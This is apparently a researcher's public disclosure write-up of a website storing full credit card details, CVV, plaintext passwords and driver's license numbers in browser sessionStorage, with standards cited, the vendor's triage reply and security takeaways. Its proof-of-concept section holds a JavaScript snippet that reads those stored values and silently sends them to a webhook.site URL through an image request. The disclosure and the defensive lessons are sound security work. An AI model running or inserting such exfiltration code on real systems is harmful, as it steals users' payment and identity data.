# 🛑 Client-Side Sensitive Data Exposure – Full Credit Card, Password & ID Stored in Plaintext

> Real-world disclosure of a critical web security flaw: full credit card details, login credentials, and ID numbers stored in plaintext in the browser's memory. Discovered and responsibly disclosed via HackerOne.

---

## 📌 Summary

This repository documents a **critical vulnerability** I discovered on a major website where **highly sensitive user data was stored in plaintext** in the browser using `sessionStorage` and cookies.

### Exposed Data:
- Full credit card number (PAN), CVV, expiration date
- Driver’s license number
- Plaintext password
- Full user profile (name, email, phone, address)

This data was:
- Not encrypted, hashed, or protected
- Persisted across authenticated pages
- Accessible to JavaScript and DevTools
- Exfiltratable using a simple PoC without XSS or elevated privileges

---

## 🔍 Technical Overview

After logging in, the browser's `sessionStorage` contained plaintext values for:

```text
creditCardNumber, creditCardExpireMonth, creditCardExpireYear,
cvvNumber, skinnyPassword, driversLicense, personalAddress1,
firstName, lastName, email, phone
Any JavaScript running in the session context (e.g. browser extension, injected third-party widget) could access this information and exfiltrate it silently.

⸻

🧪 Proof of Concept

A minimal exfiltration script, executed in the browser console or via a malicious extension:
var stealthImage = new Image();
stealthImage.src = "https://webhook.site/xxx?" +
  "cc=" + encodeURIComponent(sessionStorage.getItem("creditCardNumber")) +
  "&cvv=" + encodeURIComponent(sessionStorage.getItem("cvvNumber")) +
  "&expMonth=" + encodeURIComponent(sessionStorage.getItem("creditCardExpireMonth")) +
  "&expYear=" + encodeURIComponent(sessionStorage.getItem("creditCardExpireYear")) +
  "&dl=" + encodeURIComponent(sessionStorage.getItem("driversLicense")) +
  "&pwd=" + encodeURIComponent(sessionStorage.getItem("skinnyPassword")) +
  "&email=" + encodeURIComponent(sessionStorage.getItem("email")) +
  "&phone=" + encodeURIComponent(sessionStorage.getItem("phone")) +
  "&url=" + encodeURIComponent(window.location.href);
document.body.appendChild(stealthImage);
📤 Data was successfully exfiltrated using Webhook.site, confirming real-world impact.

📜 Standards Violated
	•	🔴 PCI DSS Requirement 3.2 – Storing CVV/PAN in plaintext after auth is strictly forbidden.
	•	🟠 OWASP Secure Storage – Advises against storing sensitive data in browser storage.
	•	🔵 GDPR / CCPA – Personal and financial data must be securely stored and processed.
🔁 Vendor Response

“Storing sensitive data in browser storage is not best practice, but not an exploit unless XSS or physical access is involved.”
– HackerOne Triage

However, based on the working PoC, successful data exfiltration, and evidence of partial post-report mitigation, I’ve requested a formal re-evaluation.

⸻

🔐 Security Takeaways

✔️ Never store sensitive data on the client side
✔️ Assume anything in browser memory can be accessed by an attacker
✔️ Don’t rely on “no XSS = no risk” logic — real-world attacks happen without injections
✔️ Build with secure-by-design principles from day one
👤 About the Researcher

cybernomad42
	•	Freelance pentester & bug bounty researcher
	•	Security consultant specializing in client-side flaws, web app security, and compliance risks
	•	LinkedIn: linkedin.com/in/patrykkieszek
	•	HackerOne: hackerone.com/cybernomad42

📂 Repository Tags

bug-bounty pentesting sessionStorage plaintext-data credit-card-leak
client-side-vulnerability pci-dss owasp javascript-security cybersecurity
